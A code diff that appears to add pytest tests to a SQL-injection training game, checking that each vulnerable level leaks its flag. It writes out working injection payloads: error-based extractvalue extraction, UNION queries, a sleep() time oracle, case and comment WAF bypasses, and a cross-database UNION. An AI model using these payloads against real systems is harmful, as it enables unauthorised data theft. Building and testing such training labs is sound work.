@@ -118,3 +118,61 @@ def test_the_vault_second_order_injection(monkeypatch, tmp_path):
     board = _req({})
     board.subpath = "/board"
     assert lv.flag().encode() in lv.handle(board, db).body       # …executed on the board
+
+
+def test_the_ledger_error_based_32char_windows(monkeypatch, tmp_path):
+    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
+    from deadwood.levels.l_the_ledger import xpath_leak
+    lv = by_slug("the-ledger")
+    db = _db_for(lv)
+    expr = "(SELECT value FROM secrets WHERE label='the-ledger')"
+    one = xpath_leak(f"1' AND extractvalue(1,concat(0x7e,{expr}))-- -", db)
+    assert len(one) == 32 and lv.flag().startswith(one) and one != lv.flag()   # truncates at 32
+    w1 = xpath_leak(f"1' AND extractvalue(1,concat(0x7e,substring({expr},1,32)))-- -", db)
+    w2 = xpath_leak(f"1' AND extractvalue(1,concat(0x7e,substring({expr},33,32)))-- -", db)
+    assert w1 + w2 == lv.flag()                                                 # windows reassemble
+    assert b"error in your SQL syntax" in lv.handle(_req({"ref": "1'"}), db).body
+    assert b"error in your SQL syntax" not in lv.handle(_req({"ref": "1''"}), db).body
+
+
+def test_the_strongbox_double_quote_union(monkeypatch, tmp_path):
+    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
+    lv = by_slug("the-strongbox")
+    db = _db_for(lv)
+    out = lv.handle(_req({"box": 'zzz" UNION SELECT label,value,1 FROM secrets-- -'}), db).body
+    assert lv.flag().encode() in out
+
+
+def test_the_watchman_paren_time_oracle(monkeypatch, tmp_path):
+    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
+    import time
+    lv = by_slug("the-watchman")
+    db = _db_for(lv)
+
+    def t(q):
+        s = time.monotonic()
+        lv.handle(_req({"q": q}), db)
+        return time.monotonic() - s
+    fast = t("x') OR (id=1 AND sleep(0))-- -")
+    slow = t("x') OR (id=1 AND sleep(1))-- -")           # paren breakout, fires once
+    assert slow - fast > 0.6
+
+
+def test_the_gauntlet_waf_case_and_comment_bypass(monkeypatch, tmp_path):
+    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
+    lv = by_slug("the-gauntlet")
+    db = _db_for(lv)
+    assert b"blocked that" in lv.handle(_req({"id": "1 UNION SELECT 1,2,3"}), db).body  # literal blocked
+    case = lv.handle(_req({"id": "0 UnIoN SeLeCt 1,label,value FROM secrets-- -"}), db).body
+    comment = lv.handle(_req({"id": "0 UNION/**/SELECT 1,label,value FROM secrets-- -"}), db).body
+    assert lv.flag().encode() in case and lv.flag().encode() in comment
+
+
+def test_the_annex_cross_database(monkeypatch, tmp_path):
+    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
+    lv = by_slug("the-annex")
+    db = _db_for(lv)
+    out = lv.handle(_req({"id": "0 UNION SELECT 1,label,value FROM archive.secrets-- -"}), db).body
+    assert lv.flag().encode() in out
+    main = "".join(r[0] for r in db.execute("SELECT value FROM secrets"))
+    assert lv.flag() not in main                         # the flag is only in the ATTACHed db
